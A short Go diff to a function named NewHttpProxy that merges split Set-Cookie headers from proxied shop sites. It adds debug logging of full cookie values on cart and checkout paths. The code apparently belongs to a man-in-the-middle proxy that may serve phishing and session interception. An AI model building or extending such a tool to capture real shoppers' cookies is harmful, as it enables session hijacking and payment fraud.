@@ -1417,10 +1417,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// 合并分离的 cookie 属性（Shopify 等网站可能返回格式不标准的 Set-Cookie）
 			// 例如：set-cookie: _shopify_y=xxx\nset-cookie: domain=strapya.store\nset-cookie: path=/
 			mergedCookies := p.mergeSplitCookies(rawCookies)
+			reqPath := resp.Request.URL.Path
+			if strings.Contains(reqPath, "cart/add") || strings.Contains(reqPath, "checkout") || strings.Contains(reqPath, "checkouts") {
+				log.Debug("COOKIE_DEBUG [%s]: raw=%d, merged=%d, final=%v", reqPath, len(rawCookies), len(mergedCookies), mergedCookies)
+			}
 
 			for _, rawCookie := range mergedCookies {
-				// 调试日志：打印原始 Set-Cookie
-				log.Debug("Original Set-Cookie: %s", rawCookie)
 
 				// 检查原始 Set-Cookie 是否包含 Partitioned 属性（Go 的 http.Cookie 不支持此属性）
 				hasPartitioned := strings.Contains(rawCookie, "; Partitioned")
